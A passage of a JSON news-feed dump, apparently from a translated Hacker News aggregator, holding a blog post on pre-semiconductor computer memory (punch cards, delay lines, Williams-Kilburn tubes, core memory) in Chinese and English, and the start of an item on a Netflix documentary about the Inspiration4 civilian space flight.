u6c64\u59c6\u00b7\u57fa\u5c14\u672c\u4e8e 1948 \u5e74\u53d1\u660e\u3002\u8be5\u8bbe\u5907\u57fa\u672c\u4e0a\u662f\u4e00\u4e2a CRT \u7ba1\uff0c\u4e0e\u60a8\u5728\u65e7\u7535\u89c6\u4e2d\u770b\u5230\u7684\u975e\u5e38\u76f8\u4f3c\uff0c\u5e76\u4e14\u53ef\u4ee5\u5c06\u6570\u636e\u4f4d\u6295\u5f71\u4e3a\u7ba1\u7684 x/y \u7f51\u683c\u4e0a\u7684\u70b9\u3002\u867d\u7136\u4e00\u4e9b\u7ba1\u5b50\u5185\u90e8\u6d82\u6709\u78f7\u5149\u4f53\uff0c\u4f46\u4fdd\u6301\u4f4d\u72b6\u6001\u7684\u5e76\u4e0d\u662f\u6765\u81ea\u70b9\u7684\u5149\uff0c\u800c\u662f\u7535\u5b50\u67aa\u53d1\u5c04\u65f6\u5728\u5c4f\u5e55\u4e0a\u4ea7\u751f\u7684\u4e8c\u6b21\u7535\u8377\u3002\u5199\u5165\u7684\u4efb\u4f55\u7279\u5b9a\u70b9\u7684\u7535\u8377\u90fd\u9700\u8981\u4e00\u6bb5\u65f6\u95f4\u624d\u80fd\u8870\u51cf\uff0c\u5728\u6b64\u671f\u95f4\uff0cCRT \u524d\u9762\u7684\u68c0\u6d4b\u5668\u677f\u4f1a\u8bfb\u53d6\u70b9\u7684\u503c\uff0c\u5e76\u5c06\u4efb\u4f55\u9010\u6e10\u6d88\u5931\u7684\u201c1\u201d\u5199\u5165\u6ee1\u7535\u8377\u8017\u5c3d\u524d\u7684\u7535\u8377\u5f3a\u5ea6\u3002\u5982\u679c\u8fd9\u542c\u8d77\u6765\u771f\u7684\u50cf hacky / Rube Goldberg \u4e00\u6837\uff0c\u8bf7\u8bb0\u4f4f\uff0c\u6b64\u539f\u7406\u4e0e\u73b0\u4ee3\u52a8\u6001 ram \u975e\u5e38\u76f8\u4f3c\uff0c\u540e\u8005\u4e34\u65f6\u5b58\u50a8\u7535\u8377\uff0c\u5e76\u4e14\u8fd8\u9700\u8981\u5b9a\u671f\u8fdb\u884c\u5237\u65b0\u5faa\u73af\u4ee5\u91cd\u5199\u503c\u3002\u65e0\u8bba\u5982\u4f55\uff0c\u8fd9\u79cd\u5b58\u50a8\u5668\u5728\u6821\u51c6\u3001\u78e8\u635f\u548c\u5176\u4ed6\u65b9\u9762\u5b58\u5728\u5404\u79cd\u95ee\u9898\uff0c\u4f46\u5b83\u53ef\u4ee5\u8bf4\u662f\u7b2c\u4e00\u4e2a\u53d1\u660e\u7684\u7535\u5b50\u968f\u673a\u5b58\u53d6\u5b58\u50a8\u5668\uff0c\u5b83\u6bd4\u5ef6\u8fdf\u7ebf\u7b49\u65e7\u65b9\u6cd5\u5177\u6709\u5de8\u5927\u7684\u4f18\u52bf\u3002\u5728 1940 \u5e74\u4ee3\u672b\u548c 1950 \u5e74\u4ee3\u521d\uff0c\u5a01\u5ec9\u59c6\u65af-\u57fa\u5c14\u672c\u7ba1\u6210\u529f\u5730\u7528\u4e8e IBM \u548c\u5176\u4ed6\u516c\u53f8\u5236\u9020\u7684\u51e0\u53f0\u5546\u7528\u8ba1\u7b97\u673a\u4e0a\u3002\u534a\u5bfc\u4f53\u524d\u5b58\u50a8\u9886\u57df\u771f\u6b63\u7684\u6e38\u620f\u89c4\u5219\u6539\u53d8\u8005\u662f\u5728 1951 \u5e74\u5de6\u53f3\uff0c\u5f53\u65f6\u5b89\u738b\u548c\u5176\u4ed6\u4eba\u5f00\u53d1\u4e86\u78c1\u82af\u5b58\u50a8\u5668\u3002\u6838\u5fc3\u662f\u4e00\u79cd\u7531\u73af\u5f62\u94c1\u6c27\u4f53\u78c1\u73e0\u77e9\u9635\u7ec4\u6210\u7684\u6280\u672f\uff0c\u8be5\u78c1\u73e0\u53ef\u4ee5\u6839\u636e\u901a\u8fc7\u78c1\u73e0\u4e32\u6210\u7684\u884c\u548c\u5217\u7ebf\u611f\u5e94\u5230\u6bcf\u4e2a\u78c1\u73e0\u4e2d\u7684\u78c1\u573a\u6781\u6027\u6765\u4fdd\u6301\u72b6\u6001\u3002\u4e0e\u5a01\u5ec9\u59c6\u65af\u7ba1\u4e00\u6837\uff0c\u6838\u5fc3\u5185\u5b58\u53ef\u4ee5\u968f\u673a\u8bbf\u95ee\uff0c\u4f46\u901f\u5ea6\u66f4\u5feb\uff0c\u901a\u5e38\u66f4\u53ef\u9760\uff0c\u4fe1\u606f\u5bc6\u5ea6\u66f4\u5927\u3002\u4e0e\u5176\u524d\u8f88\u4e0d\u540c\uff0c\u65e0\u8bba\u5927\u5c0f\u5982\u4f55\uff0c\u8fd0\u884c\u6838\u5fc3\u5185\u5b58\u6240\u9700\u7684\u7535\u91cf\u901a\u5e38\u90fd\u662f\u6301\u5e73\u7684\uff0c\u5e76\u4e14\u4f7f\u7528\u8be5\u6280\u672f\u53ef\u4ee5\u5b9e\u73b0\u66f4\u5927\u7684\u6570 KB \u7cfb\u7edf\u3002\u4f46\u662f\u6709\u51e0\u4e2a\u7f3a\u70b9\u3002\u7b2c\u4e00\u4e2a\u95ee\u9898\u662f\u94c1\u6c27\u4f53\u78c1\u73e0\u7684\u5236\u9020\u6210\u672c\u5f88\u9ad8\uff0c\u5e76\u4e14\u5fc5\u987b\u4e00\u6b21\u4e00\u70b9\u5730\u624b\u5de5\u4e32\u8d77\u6765\u3002\u4ece 1950 \u5e74\u4ee3\u5f00\u59cb\uff0c\u4e00\u76f4\u5230 1970 \u5e74\u4ee3\u4e2d\u671f\u534a\u5bfc\u4f53 RAM \u7cfb\u7edf\u63a5\u7ba1\u65f6\uff0c\u5de5\u5382\u5de5\u4eba\u7684\u519b\u961f\uff0c\u901a\u5e38\u662f\u5973\u6027\uff0c\u56e0\u4e3a\u5979\u4eec\u7684\u624b\u8f83\u5c0f\u4e14\u8fd0\u52a8\u6280\u80fd\u597d\uff0c\u56e0\u6b64\u4e00\u76f4\u81f4\u529b\u4e8e\u7ec4\u88c5\u8fd9\u4e9b\u7cfb\u7edf\u3002\u90a3\u65f6\u7684\u8ba1\u7b97\u673a\u4e00\u822c\u90fd\u662f\u624b\u5de5\u5236\u4f5c\u7684\uff0c\u4f46\u4e5f\u975e\u5e38\u6602\u8d35 - \u56e0\u6b64\uff0c\u8003\u8651\u5230\u5185\u6838\u63d0\u4f9b\u7684\u589e\u5f3a\u529f\u80fd\uff0c\u4e3a\u5185\u6838\u652f\u4ed8\u4e00\u70b9\u989d\u5916\u8d39\u7528\u5e76\u4e0d\u662f\u4ec0\u4e48\u5927\u4e0d\u4e86\u7684\u4e8b\u3002\u78c1\u82af\u7684\u7b2c\u4e8c\u4e2a\u95ee\u9898\u662f\uff0c\u7528\u4e8e\u8bfb\u53d6\u94c1\u6c27\u4f53\u78c1\u73e0\u7684\u8fc7\u7a0b\u4e5f\u53cd\u8f6c\u4e86\u78c1\u573a\uff0c\u6709\u6548\u5730\u64e6\u9664\u4e86\u4f4d\u7684\u72b6\u6001\u3002\u8fd9\u5c31\u662f An Wang \u7684\u7528\u6b66\u4e4b\u5730\uff0c\u56e0\u4e3a\u4ed6\u4e3a\u8fd9\u4e2a\u95ee\u9898\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7535\u8def\u89e3\u51b3\u65b9\u6848\uff0c\u8be5\u89e3\u51b3\u65b9\u6848\u4e3a\u5185\u6838\u8bbf\u95ee\u5f15\u5165\u4e86\u5148\u8bfb\u540e\u5199\u5468\u671f\uff0c\u8fd9\u662f\u4e00\u79cd\u4ec5\u5728\u8bfb\u53d6\u5185\u5b58\u65f6\u53d1\u751f\u7684\u79bb\u6563\u5237\u65b0\u3002\n\u5c3d\u7ba1\u6709\u4efb\u4f55\u6210\u672c\u6216\u602a\u7656\uff0c\u4f46\u6838\u5fc3\u8fd8\u662f\u5728\u5546\u4e1a\u4e0a\u5927\u53d7\u6b22\u8fce\uff0c\u8bb8\u591a\u8ba1\u7b97\u673a\uff0c\u5305\u62ec\u6211\u7528\u6765\u6253\u4e0a\u56fe\u4e2d\u7eb8\u5e26\u7684\u5927\u7ea6 1974 \u5e74\u7684 PDP-8\uff0c\u90fd\u5728\u6838\u5fc3\u4e0a\u8fd0\u884c\uff08\u5982\u679c\u6211\u6ca1\u8bb0\u9519\u7684\u8bdd\uff0c\u662f 32K \u9635\u5217\uff09\u3002 core \u7684\u53e6\u4e00\u4e2a\u6709\u8da3\u7684\u7279\u6027\u662f\u5b83\u662f\u4e00\u4e2a\u975e\u6613\u5931\u6027\u7cfb\u7edf\uff0c\u4e0d\u50cf\u5b83\u7684\u5927\u591a\u6570\u524d\u8f88\u3002\u6bcf\u4e2a\u94c1\u6c27\u4f53\u78c1\u73e0\u4e2d\u7684\u78c1\u573a\u90fd\u76f8\u5f53\u6301\u4e45\uff0c\u9664\u975e\u6838\u5fc3\u7cfb\u7edf\u66b4\u9732\u5728\u5f3a\u78c1\u6e90\u4e0b\uff0c\u5426\u5219\u5373\u4f7f\u6ca1\u6709\u7535\u6e90\uff0c\u5b58\u50a8\u5668\u7684\u72b6\u6001\u4e5f\u5e94\u8be5\u51e0\u4e4e\u65e0\u9650\u671f\u5730\u6301\u7eed\u4e0b\u53bb\u3002\u8fd9\u610f\u5473\u7740\u6240\u6709\u5b58\u50a8\u5728\u67d0\u4e2a\u5730\u65b9\u3001\u535a\u7269\u9986\u3001\u5783\u573e\u586b\u57cb\u573a\u6216\u4efb\u4f55\u5730\u65b9\u7684\u65e7\u8ba1\u7b97\u673a\uff0c\u53ef\u80fd\u4ecd\u7136\u5305\u542b\u5b83\u4eec\u8fd0\u884c\u8fc7\u7684\u6700\u540e\u4e00\u4e2a\u7a0b\u5e8f\u3002\u5982\u679c\u60a8\u80fd\u627e\u5230\u4e00\u79cd\u65b9\u6cd5\u6765\u542f\u52a8\u7535\u6e90\uff0c\u90a3\u4e48\u8be5\u4ee3\u7801\u5b9e\u9645\u4e0a\u53ef\u4ee5\u518d\u6b21\u8fd0\u884c\u3002\u6838\u5fc3\u4e4b\u540e\u662f MOS \u548c CMOS \u5b58\u50a8\u5668\uff0c\u4ee5\u9759\u6001\u548c\u52a8\u6001 RAM\u3001EEPROMS \u548c\u4e00\u4e9b\u4ece\u672a\u6d41\u884c\u8fc7\u7684\u78c1\u6ce1\u5b58\u50a8\u5668\u7b49\u5947\u602a\u7684\u4e1c\u897f\u7684\u5f62\u5f0f\u51fa\u73b0\u3002\u4f46\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c1970 \u5e74\u4ee3\u7684\u8bb0\u5fc6\u7cfb\u7edf\u4e0e\u6211\u4eec\u4eca\u5929\u62e5\u6709\u7684\u975e\u5e38\u76f8\u4f3c\u3002\u66f4\u5c0f\u3001\u66f4\u5feb\uff0c\u5177\u6709\u8bb8\u591a\u521b\u65b0\u589e\u5f3a\u529f\u80fd\uff0c\u4f46\u57fa\u672c\u6280\u672f\u57fa\u672c\u76f8\u540c\u3002\u5982\u524d\u6240\u8ff0\uff0c\u6211\u5728\u65e9\u671f\u7684\u786c\u4ef6\u5de5\u7a0b\u65f6\u4ee3\u90fd\u5728\u8bbe\u8ba1\u5185\u5b58\u7cfb\u7edf\uff0c\u6211\u6709\u70b9\u9057\u61be\u6211\u6ca1\u6709\u5f00\u59cb\u7814\u7a76\u8fd9\u4e9b\u5728\u6211\u4e4b\u524d\u51fa\u73b0\u7684\u5947\u602a\u800c\u5947\u5999\u7684\u91ce\u517d\u4e2d\u7684\u4efb\u4f55\u4e00\u4e2a\u3002\u4f46\u6211\u6709\u70b9\u5e0c\u671b\u4e00\u4e2a\u65b0\u7684\u3001\u5947\u602a\u7684\u5b58\u50a8\u65f6\u4ee3\u5373\u5c06\u6765\u4e34\u3002\u91cf\u5b50\u8ba1\u7b97\u4e4b\u7c7b\u7684\u4e1c\u897f\u53ef\u80fd\u4f1a\u4e3a\u5b58\u50a8\u7cfb\u7edf\u7684\u8bbe\u8ba1\u5e26\u6765\u5947\u602a\u7684\u60f3\u6cd5\u3002\u6211\u5bf9\u91cf\u5b50\u8ba1\u7b97\u6216\u7269\u7406\u5b66\u51e0\u4e4e\u4e00\u65e0\u6240\u77e5\uff0c\u53ea\u662f\u5b83\u503e\u5411\u4e8e\u6253\u7834\u4f20\u7edf\u89c4\u5219\uff0c\u5c31\u50cf\u4e8b\u7269\u4e0d\u80fd\u540c\u65f6\u4ee5\u4e24\u79cd\u72b6\u6001\u5b58\u5728\u4e00\u6837\u3002\u542c\u8d77\u6765\u50cf\u6211\u4eec\u8fd8\u6ca1\u6709\u60f3\u5230\u7684\u5f88\u68d2\u7684\u65b0\u5b58\u50a8\u7cfb\u7edf\u7684\u5de8\u5927\u6f5c\u529b\u3002\u5229\u7528\u8fd9\u6837\u7684\u65b0\u6280\u672f\u53ef\u80fd\u9700\u8981\u63d0\u51fa\u5168\u65b0\u7684\u5947\u602a\u60f3\u6cd5\u3002\u4f46\u6709\u65f6\uff0c\u5947\u602a\u7684\u4e8b\u60c5\u4f1a\u6539\u53d8\u4e16\u754c\u3002\n\u8ba1\u7b97\u673a\u6e38\u620f\u4e16\u754c\u535a\u7269\u9986\uff08\u5b8c\u6574\u7684\u5370\u5237\u7a0b\u5e8f\u95ee\u9898\uff0c\u60a8\u53ef\u4ee5\u5c3d\u60c5\u8f93\u5165\uff01\uff09\u4e0b\u4e00\u6b21\uff1a\u6211\u53ef\u80fd\u4f1a\u5192\u9669\u8fdb\u5165\u5efa\u8bae\u4e13\u680f\u9886\u57df\uff0c\u56e0\u4e3a\u6211\u5206\u4eab\u4e86\u5728\u79d1\u6280\u884c\u4e1a\u5de5\u4f5c 30 \u591a\u5e74\u6240\u5b66\u5230\u7684\u4e00\u4e9b\u4e1c\u897f\u3002\u6211\u7684\u667a\u6167\u4e4b\u73e0\u63a5\u4e0b\u6765\u51fa\u73b0\u5728\uff1a\u4e00\u4f4d\u8001\u9ed1\u5ba2\u5173\u4e8e\u4fdd\u6301\u5de5\u4f5c\u7684\u79d8\u8bc0 \u559c\u6b22\u8fd9\u7bc7\u6587\u7ae0\u5417\uff1f\u4e3a\u4ec0\u4e48\u4e0d\u8ba2\u9605\uff1f\u83b7\u53d6\u6709\u5173\u8ba1\u7b97\u673a\u6280\u672f\u3001\u8fc7\u53bb\u73b0\u5728\u548c\u672a\u6765\u7684\u5947\u602a\u800c\u53e4\u602a\u7684\u6545\u4e8b - \u5b9a\u671f\u53d1\u9001\u5230\u60a8\u7684\u6536\u4ef6\u7bb1\u3002\u5b83\u662f\u514d\u8d39\u4e14\u65e0\u5e7f\u544a\u7684\uff0c\u60a8\u53ef\u4ee5\u968f\u65f6\u53d6\u6d88\u8ba2\u9605\u3002 Mad Ned Memo \u975e\u5e38\u91cd\u89c6\u8ba2\u9605\u8005\u7684\u9690\u79c1\uff0c\u4e0d\u4f1a\u4e0e\u7b2c\u4e09\u65b9\u5171\u4eab\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u6216\u5176\u4ed6\u4fe1\u606f\u3002\u6709\u5173\u66f4\u591a\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u5355\u51fb\u6b64\u5904\u3002", "note_en": "It is tempting to spend a lot of time in this article marveling over how small and cheap computer storage has gotten versus the old days. In the 1980\u2019s when I worked for  Digital Equipment Corporation, my first job was to design memories for a mainframe computer. The system we were building could theoretically have up to 1GB of memory, but we laughed at this idea at the time, because it would require multiple refrigerator-sized cabinets and millions of dollars to build it, and who needs a gigabyte of memory, anyway?\n Now of course, a USB drive in the back of your desk drawer that is only 1GB gets thrown out for being too small, and a suitable replacement can be found for under $10 at the supermarket checkout stand. I think though that is all the time I\u2019ll devote to talking about this remarkable progression. Although it still boggles my mind every time I think about the comparison, it\u2019s a thoroughly covered topic.\n Instead I wanted to rewind even further back, and look at storage systems that are even older than the (admittedly old) stuff I usually write about. Some of these I\u2019ve actually used, but some I\u2019ve just learned about over the years.\n  Paper as a storage medium has been around a long time. Paper rolls to control musical instruments such as pianos date back to the mid 19th century. IBM got its start building machines that improved upon even older paper-card tabulators from the 1800\u2019s, expanding the size and thus storage of the existing 22-column cards to 80. They also changed the holes along the way from round to rectangular, and the  IBM punch card was born. (Also, fun fact, the reason old CRT terminals have 80 columns of text characters)\n    This format ruled the early information age from the 1920\u2019s all the way up into the 1970s. (IBM says in the link above that these cards stored all of the worlds information in the first half of the 20th century, but I think they are forgetting about books.)\n I had a brief stint of writing programs on these cards in a COBOL class in the 70\u2019s at our high school. Using cards as a programming storage medium was already becoming outmoded by then, but still alive and well in the not-so-cutting-edge public school system I was in.\n The two things I remember about it are, first, the unforgiving nature of making a mistake, which did not allow for a delete key to un-punch a hole, you just started a new card. The second is what happens if you drop your card deck. Every line of your program scatters to the floor in random order, and re-sequencing them was a pain. Each program statement would have a line number on the card so it could be figured out, but reading hundreds of cards and shuffling them around was tedious.\n If you were lucky, you could use something like an  IBM card sorter to do it, but unlikely this critical data processing center equipment would be available for your use in reassembling a deck. The pros therefore took a big magic marker and drew a diagonal stripe down the side of the deck, so you can visually spot cards out of order.\n I spent more time in the 70\u2019s with another paper format, paper tape. A paper tape punch was a common peripheral that was attached to  teletype machines, such as the Model 33 I used in school to write BASIC programs. The punch and reader both showed up as devices in the equivalent of /dev, and much like UNIX you could just redirect a program onto or off of paper tape.\n Punching and reading were dead slow, due to the mechanical speed limitations and also the fairly basic encoding used (6 bit ASCII). But it was a true read/write format, even if you could not erase and reuse the medium. And a lot easier to manage than cards since no typing was involved.\n    Last paper storage device I\u2019ll mention is the printer. You might not think of a printer as a storage device, but it was very common in the 70\u2019s and even 80\u2019s to share programs by printing them. The printer was the \u2018writer\u2019, and the \u2018reader\u2019 would be the guy having to type it back in, which was of course very slow. But many magazines and books of the time would publish programs in print to share with their readers, and I spent more than a few hours typing in BASIC programs from print, then trying to find all my typos.\n I recently found a printout of a program I wrote when I was 17, stuck in an old Computer Gaming World magazine from the 80\u2019s. It was a game I wrote, and I decided to resurrect it and see if I could get it running. (Spoiler is, I did - but I will be covering that one in another post.) The thing I find amazing about paper storage format is its longevity. Card decks and paper tape punched decades ago is still quite viable, provided you can find a way to read it, and provided it did not get wet at any time.\n     Paper is all well and good as a storage medium for the mechanical computer age, but when electronic computers came around in the 1940\u2019s, a faster solution was desirable, at least for main memory, or \u201cstore\u201d as it was more commonly referred to back then. If you think of punch cards as being the large-capacity \u201cdisk storage\u201d of the day, it still left a need for a smaller, faster storage device for programs and data that could keep up with the processor (like dynamic ram systems of today).\n Mechanical solutions were out \u2014 and electronic ones in. But there was a problem of scale, since integrated circuits were still twenty years away, and even the transistor had not been invented yet. Register circuits made out of tubes could be constructed, but it would take at minimum 4-5 tubes and associated discrete components to store a single bit. This was fast but required a lot of space, and a lot of power. Tens of thousands of tubes just to store a kilobyte of data, creating all sorts of cost, power, thermal, and reliability problems.\n The motivation to build a smaller storage device was high, so they got creative about where they could keep all their bits around for a while. One of the earliest solutions was, to use a wire. Slightly more complex, but basically, a wire. The idea was based off of the principal of wave propagation, where an electrical pulse would take time to travel down a conductor, and if the conductor was long enough, several pulses representing bits could be stored in the wire as they travelled.\n This technical area is also referred to as transmission line theory, and it later haunted systems engineers like me, because the effects of signals propagating in wires can lead to delays and even reflections that cause timing and signal integrity problems for fast circuits. The computers of the 1940s though were slow enough that many of these issues were not a problem then.\n This is not to say that  delay line memory as it was called, was an easy thing to engineer. There were many problems, the first of which being that a wire, even a long wire, does not store information for very long. They got around this by building even slower propagation circuits, using chains of capacitors to form an electric delay line. It could not store a lot of bits, but was relatively cheap and faster than mechanical storage.\n Then things get really strange. The next invention in this area was something called a  mercury delay line, which was basically a big tank of liquid mercury with a piezoelectric crystal on one end, and a microphone on the other. The crystal would produce a tight-beam sound wave that would propagate through the mercury, which has a very high propagation rate for sound vs. air or water (1450 m/s vs. 340 m/s for air).\n Pulses of sound would be transmitted into the tank as a serial stream, and read out the other end, amplified, modified, fed back in. Length of the tube had to be carefully selected so the cycle time of the system was in line with the CPU clock rate, and multiple tubes were needed to store anything more than a hundred or so bits.\n    By the early 1950\u2019s computers were getting complex enough that they needed more storage, and faster storage. Delay lines were rather limited in capacity, and the latency of electrical or sound waves propagating through some medium created a fundamental access time limit that was getting in the way of CPU throughput. Add to that the issues with the serial aspect of memory access, and don\u2019t even start to think about the toxicity issues of having all that mercury around.\n Long way of saying, computer engineers of the day were not satisfied yet (they never are, trust me) and went on to find other weird and wacky ways to store data, even in the absence of semiconductors.\n The next thing they came up with is one of my personal favorites, something called the  Williams-Kilburn Tube \u2014 Invented in 1948 by (surprise) Fred Williams and Tom Kilburn. This device was basically a CRT tube very similar to one you would find in an old television, and bits of data could be projected as dots on an x/y grid of the tube. Although some tubes were coated inside with phosphor, it was not the light from the dots that held the state of the bits, but rather the secondary electrical charge produced on the screen when the electron gun fired.\n The charge for any particular dot that was written would take a while to decay, and in the intervening time, a detector plate in front of the CRT would read the values of the dots, and write any \u201cones\u201d that were fading back to full charge strength before the charge was depleted. If that sounds really hacky /  Rube Goldberg-like, keep in mind that this principle is very similar to modern-day dynamic ram, which stores charge temporarily and also requires a refresh cycle to occur periodically to rewrite values.\n Anyway this memory had all sorts of issues with calibration, wear-out, and other things, but it was arguably the first electronic random-access memory invented, which had huge advantages over older approaches like delay lines. Williams-Kilburn tubes were successfully used on several commercial computers made by IBM and others in the late 1940\u2019s and early 1950\u2019s.\n     The real game-changer of the pre-semiconductor storage scene though would come in 1951 or so, when  magnetic core memory was developed by  An Wang and others. Core was a technology consisting of a matrix of donut-shaped ferrite beads that could hold state based on the polarity of a magnetic field that was induced into each one, via row and column wires strung through the beads.\n Like the Williams Tube, core memory was randomly-accessible, but faster and generally more reliable, and with a greater information density. The amount of power needed to operate a core memory was generally flat regardless of the size, unlike its predecessors, and larger, multi-kilobyte systems were feasible with the technology. But there were a couple of downsides.\n The first issue was that ferrite beads were expensive to make, and had to be hand strung, one bit at a time. Armies of factory workers, usually women because of their smaller hands and fine motor skills, worked to assemble these systems from the 1950\u2019s, all the way into the mid 1970s when semiconductor RAM systems took over. Computers in general were hand made back then, and also very expensive though - so a little extra expense for core was not too big a deal, given the increased capability afforded by it.\n The second issue with core was, the process used to read the ferrite beads also reversed the magnetic field, effectively erasing the state of the bit. This is where An Wang comes in though, because he contributed a circuit solution for this problem that introduced a read-then-write cycle for core access, kind of a discrete refresh that only takes place when the memory was read.\n Despite any costs or quirks, core was a commercial hit, and many computers, including the circa 1974  PDP-8 I used to punch that paper tape in the picture above, ran on core (a 32K array, if I remember right).\n Another interesting property of core was that it is a non-volatile system, unlike most of its predecessors. The magnetic field in each ferrite bead is quite durable, and unless the core system is exposed to a strong magnetic source, the state of the memory should last almost indefinitely, even with no power.\n That means that all those old computers in storage somewhere, in museums, in landfills or wherever they may be, likely still contain the last program they ever ran. And If you could find a way to power one on, that code could actually run again.\n    After core came MOS and CMOS memory in the form of static and dynamic RAM, EEPROMS, and a few oddball things like  magnetic bubble memory that never caught on. But for the most part, memory systems of the 1970\u2019s are very similar to the ones we have today. Smaller, faster, with a host of innovative enhancements, but essentially the same base technologies.\n As mentioned I spent my early hardware engineering days designing memory systems, and I\u2019m just a little sad I didn\u2019t get to work on any of these weird and wonderful beasts that came before my time. But I\u2019m a little hopeful that a new, weird age of storage may soon be upon us.\n Things like  quantum computing will likely bring back strange ideas to design of storage systems. I know close to nothing about quantum computing or physics, except that it tends to break traditional rules, like things cannot exist in two states at the same time. Sounds like a great potential for awesome new storage systems we haven\u2019t even thought of yet.\n Taking advantage of new technology like this may require coming up with a whole new crop of weird ideas. But sometimes, weird changes the world.\n   Computer Gaming World Museum (full issues with printed programs you can have fun typing in!)\n Next Time: I perhaps risk venturing into advice column territory, as I share some things learned over 30-something years working in the tech industry. My pearls of wisdom coming up next in:  An Old Hacker\u2019s Tips on Staying Employed\n  Enjoyed this post? Why not subscribe? Get strange and nerdy tales of computer technology, past present and future - delivered to your inbox regularly. It\u2019s cost-free and ad-free, and you can unsubscribe any time.\n  The Mad Ned Memo takes subscriber privacy seriously, and does not share email addresses or other information with third parties. For more details,   click here .", "posttime": "2021-08-05 20:53:03", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u7535\u8111,\u8bb0\u5fc6,memories,\u5b58\u50a8", "title": "\u5947\u602a\u7684\u8bb0\u5fc6\uff0c\u7535\u8111\u8fc7\u53bb\u7684\u8bb0\u5fc6", "title_en": "Memories of Weird Memories, of Computers Past", "transed": 1, "url": "https://madned.substack.com/p/whats-in-store", "via": "", "real_tags": ["\u7535\u8111", "\u8bb0\u5fc6", "memories", "\u5b58\u50a8"]}, {"category": "", "categoryclass": "", "imagename": "a525c5831468fe064c00ca8feeff7e91.jpg", "infoid": 1071331, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "Netflix \u5c06\u5728\u4e0b\u4e2a\u6708\u64ad\u653e\u4e00\u90e8\u7eaa\u5f55\u7247\uff0c\u8bb2\u8ff0\u4e16\u754c\u4e0a\u7b2c\u4e00\u4e2a\u79c1\u4eba\u5168\u6c11\u7528\u592a\u7a7a\u8f68\u9053\u7684\u6545\u4e8b\u3002\u8be5\u5c0f\u7ec4\u5c06\u5728\u4e0b\u4e2a\u6708\u767b\u4e0a SpaceX \u592a\u7a7a\u8231\uff0c\u5e76\u5728\u5730\u7403\u8f68\u9053\u4e0a\u98de\u884c\u4e09\u5929\uff0c\u6210\u4e3a Netflix \u7684\u7b2c\u4e00\u90e8\u201c\u8fd1\u4e4e\u5b9e\u65f6\u5730\u62a5\u9053\u4e8b\u4ef6\u201d\u7684\u7eaa\u5f55\u7247\u3002\u8fd9\u6b21\u79c1\u4eba\u5305\u673a\u5c06\u7531 38 \u5c81\u7684\u4ebf\u4e07\u5bcc\u7fc1\u8d3e\u91cc\u5fb7\u00b7\u827e\u8428\u514b\u66fc (Jared Isaacman) \u6307\u6325\u3001\u8d44\u52a9\u548c\u9886\u5bfc\uff0c\u65e8\u5728\u4e3a\u5723\u88d8\u5fb7\u513f\u7ae5\u7814\u7a76\u533b\u9662\u63d0\u4f9b 2 \u4ebf\u7f8e\u5143\u7684\u652f\u6301\u3002\u5728@spacex Falcon 9 \u706b\u7bad\u4e0a\u5199\u4e0b\u6211\u7684\u540d\u5b57\uff0c\u5b83\u5c06\u628a\u6211\u548c\u6211\u7684\u8239\u5458\u5e26\u5230\u592a\u7a7a\u3002 \ud83e\udd2f pic.twitter.com/MuscPe3j3B \u2014 \u666e\u7f57\u514b\u7279\u535a\u58eb (@DrSianProctor) 2021 \u5e74 8 \u6708 3 \u65e5 \u5730\u7403\u79d1\u5b66\u5bb6\u3001\u524d NASA \u5019\u9009\u4eba Sian Proctor\u3001\u7f8e\u56fd\u7a7a\u519b\u9000\u4f0d\u519b\u4eba Christopher Sembroski \u548c\u533b\u751f\u6d77\u8389 Arceneaux \u5c06\u52a0\u5165\u4ed6\u7684\u884c\u5217St Jude \u7684\u52a9\u7406\u548c\u513f\u7ae5\u764c\u75c7\u5e78\u5b58\u8005\u3002\u8be5\u5c0f\u7ec4\u663e\u7136\u5c06\u5230\u8fbe\u6bd4\u56fd\u9645\u7a7a\u95f4\u7ad9\u66f4\u9ad8\u7684\u9ad8\u5ea6\uff0c\u56e0\u4e3a\u4ed6\u4eec\u4e58\u5750 SpaceX Dragon \u592a\u7a7a\u8231\u73af\u7ed5\u5730\u7403\u8fd0\u884c\uff0c\u79f0\u4e3a Inspiration4\u3002\n\u8fd9\u90e8\u5feb\u901f\u5468\u8f6c\u7684\u7eaa\u5f55\u7247\u5c06\u5206\u4e3a\u4e94\u90e8\u5206\uff0c\u524d\u4e24\u90e8\u5206\u5c06\u4e8e 9 \u6708 6 \u65e5\u9996\u6620\u3002 Inspiration4 \u7684\u5b9e\u9645\u53d1\u5e03\u5b9a\u4e8e 9 \u6708 15 \u65e5 - \u8be5\u6d3b\u52a8\u5c06\u5728\u672c\u6708\u5e95\u7684\u6700\u540e\u4e00\u90e8\u5206\u4e2d\u5c55\u793a\u3002\u89c2\u4f17\u5df2\u88ab\u627f\u8bfa\u5728\u5e55\u540e\u8bbf\u95ee\u4efb\u52a1 - \u4ece\u4ed6\u4eec\u7684\u9009\u62e9\uff0c\u5230\u822a\u5929\u5668\u7ed5\u5730\u7403\u8fd0\u884c\u65f6\u7684\u5185\u90e8\u955c\u5934\u3002", "note_en": "Netflix will stream a documentary next month which will follow the story of the world&#39;s first private all-civilian space orbit.\n The group will board a   SpaceX capsule next month and spend three days orbiting the Earth, becoming Netflix&#39;s first documentary &#34;to cover an event in near real-time&#34;.\n  The privately chartered flight will be commanded, funded and led by 38-year-old billionaire Jared Isaacman, and aim to support St Jude Children&#39;s Research Hospital to the tune of $200 million.\n Writing my name on the  @spacex Falcon 9 rocket that will take me and my crew mates to space. \ud83e\udd2f  pic.twitter.com/MuScPe3j3B\n\u2014 Doctor Proctor (@DrSianProctor)  August 3, 2021\n He will be joined on board by Sian Proctor, a geoscientist and former NASA candidate, Christopher Sembroski, a US Airforce veteran, and Hayley Arceneaux, a doctor&#39;s assistant at St Jude and childhood cancer survivor.\n The group will apparently reach a higher altitude than the International Space Station as they orbit the planet in the SpaceX Dragon capsule, dubbed Inspiration4.\n   The quick-turnaround documentary will be made in five parts, with the first two premiering on 6 September.\n  Inspiration4&#39;s actual launch is scheduled for 15 September - an event which will feature in the final part at the end of the month.\n Viewers have been promised behind the scenes access of the mission - from their selection, to footage from inside the spacecraft while it orbits Earth.", "posttime": "2021-08-05 20:52:45", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u516c\u5e03,announces,\u5730\u7403", "title": 